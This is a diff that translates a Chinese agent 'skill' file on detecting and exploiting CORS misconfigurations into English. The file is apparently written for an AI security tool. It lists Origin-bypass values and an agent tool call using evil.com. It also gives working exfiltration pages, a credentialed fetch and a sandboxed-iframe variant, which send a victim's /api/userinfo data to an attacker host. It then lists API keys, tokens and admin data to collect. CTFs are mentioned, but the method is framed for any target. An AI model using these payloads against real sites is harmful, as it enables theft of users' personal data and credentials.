@@ -1,78 +1,80 @@
 ---
 name: cors-misconfiguration
-description: "CORS 跨域配置错误检测与利用。当目标 API 返回 Access-Control-Allow-Origin 响应头、需要跨域访问敏感数据、或发现 Origin 头被反射回响应中时使用。可导致用户敏感数据窃取"
+description: "CORS misconfiguration detection and exploitation. Use when a target API returns Access-Control-Allow-Origin response headers, requires cross-origin access to sensitive data, or you find that the Origin header is reflected back in the response. Can lead to theft of user sensitive data"
+zh-signals: "检测并利用 CORS 跨域配置错误，重点验证 Origin 反射与凭据携带组合导致的数据窃取。信号:CORS,跨域,Origin 反射,credentials,预检请求"
+when-to-use: "Use when a target API returns Access-Control-Allow-Origin headers, reflects arbitrary Origin, or permits credentialed cross-origin reads."
 metadata:
-  tags: "cors,cross-origin,跨域,access-control,origin,credentials,preflight"
+  tags: "cors,cross-origin,cross-domain,access-control,origin,credentials,preflight"
   category: "exploit"
 ---
 
-# CORS 配置错误方法论
+# CORS Misconfiguration Methodology
 
-CORS（Cross-Origin Resource Sharing）错误配置允许恶意网站跨域读取目标站点的敏感数据。关键在于 `Access-Control-Allow-Origin` 和 `Access-Control-Allow-Credentials` 两个响应头。
+CORS (Cross-Origin Resource Sharing) misconfiguration allows malicious websites to read the target site's sensitive data cross-origin. The key lies in the `Access-Control-Allow-Origin` and `Access-Control-Allow-Credentials` response headers.
 
-## Phase 1: 检测 CORS 配置
+## Phase 1: Detect CORS Configuration
 
-### 1.1 发送带 Origin 的请求
+### 1.1 Send a request with an Origin header
 ```
 http_request url="http://target/api/userinfo" headers={"Origin":"https://evil.com"}
 ```
 
-检查响应头：
-- `Access-Control-Allow-Origin: https://evil.com` → 反射任意 Origin（**危险**）
-- `Access-Control-Allow-Origin: *` → 通配符（通常无法携带 Cookie）
-- `Access-Control-Allow-Credentials: true` → 允许携带 Cookie（**和反射 Origin 组合 = 严重漏洞**）
-- 无 ACAO 头 → CORS 正确拒绝
+Inspect the response headers:
+- `Access-Control-Allow-Origin: https://evil.com` → reflects an arbitrary Origin (**dangerous**)
+- `Access-Control-Allow-Origin: *` → wildcard (usually cannot carry cookies)
+- `Access-Control-Allow-Credentials: true` → allows carrying cookies (**combined with reflected Origin = critical vulnerability**)
+- No ACAO header → CORS is correctly rejected
 
-### 1.2 测试 Origin 校验绕过
+### 1.2 Test Origin Validation Bypass
 
 ```
-# 空 Origin
+# Empty Origin
 Origin: null
 
-# 子域名
+# Subdomain
 Origin: https://evil.target.com
 Origin: https://target.com.evil.com
 
-# 前缀/后缀匹配
+# Prefix/suffix matching
 Origin: https://attackertarget.com
 Origin: https://target.com.attacker.com
 
-# 特殊协议
-Origin: http://target.com  (HTTPS 站点接受 HTTP Origin)
+# Special protocol
+Origin: http://target.com  (HTTPS site accepts an HTTP Origin)
 ```
 
-### 1.3 危险组合判断
+### 1.3 Dangerous Combination Assessment
 
-| Allow-Origin | Allow-Credentials | 风险等级 |
+| Allow-Origin | Allow-Credentials | Risk Level |
 |-------------|-------------------|----------|
-| 反射任意 Origin | true | **严重** — 可跨域窃取用户数据 |
-| `null` | true | **高** — iframe sandbox 可设置 null origin |
-| `*` | false | **低** — 不能携带 Cookie，通常只暴露公开数据 |
-| 固定白名单 | true | 安全（除非白名单中有你控制的域名）|
+| Reflects an arbitrary Origin | true | **Critical** — enables cross-origin theft of user data |
+| `null` | true | **High** — an iframe sandbox can set a null origin |
+| `*` | false | **Low** — cannot carry cookies, usually only exposes public data |
+| Fixed allowlist | true | Safe (unless the allowlist contains a domain you control)|
 
-## Phase 2: 利用 CORS 错误配置
+## Phase 2: Exploit the CORS Misconfiguration
 
-### 2.1 反射 Origin + Credentials（最常见）
-目标返回：
+### 2.1 Reflected Origin + Credentials (most common)
+The target returns:
 ```
 Access-Control-Allow-Origin: https://evil.com
 Access-Control-Allow-Credentials: true
 ```
 
-构造窃取页面：
+Build the exfiltration page:
 ```html
 <script>
 fetch('http://target/api/userinfo', {credentials: 'include'})
   .then(r => r.json())
   .then(data => {
-    // 发送到攻击者服务器
+    // Send to the attacker server
     fetch('http://evil.com/log?data=' + JSON.stringify(data));
   });
 </script>
 ```
 
-### 2.2 null Origin 利用
-如果 `Access-Control-Allow-Origin: null`，用 iframe sandbox 触发：
+### 2.2 null Origin Exploitation
+If `Access-Control-Allow-Origin: null`, trigger it with an iframe sandbox:
 ```html
 <iframe sandbox="allow-scripts allow-forms" srcdoc="
   <script>
@@ -83,17 +85,17 @@ fetch('http://target/api/userinfo', {credentials: 'include'})
 "></iframe>
 ```
 
-## Phase 3: 数据获取
+## Phase 3: Data Collection
 
-CORS 利用成功后，可以读取的敏感数据：
-- 用户个人信息（`/api/profile`, `/api/userinfo`）
-- API 密钥和 Token
-- 内部 API 数据
-- 管理员面板数据
+Once the CORS exploitation succeeds, the sensitive data you can read includes:
+- User personal information (`/api/profile`, `/api/userinfo`)
+- API keys and tokens
+- Internal API data
+- Admin panel data
 
-**CTF 中**：Flag 通常在需要管理员 Cookie 才能访问的 API 中。
+**In CTFs**: the flag is usually in an API that requires an admin cookie to access.
 
-## 注意事项
-- CORS 漏洞需要受害者访问攻击者页面才能触发（类似 CSRF/XSS）
-- 纯 `Access-Control-Allow-Origin: *` 不允许 `credentials: include`，风险较低
-- 检查 preflight（OPTIONS）请求的处理——有些框架只在 GET 上设置 CORS，不在 OPTIONS 上
+## Notes
+- A CORS vulnerability requires the victim to visit the attacker's page to trigger it (similar to CSRF/XSS)
+- A pure `Access-Control-Allow-Origin: *` does not allow `credentials: include`, so the risk is lower
+- Check how preflight (OPTIONS) requests are handled — some frameworks only set CORS on GET, not on OPTIONS
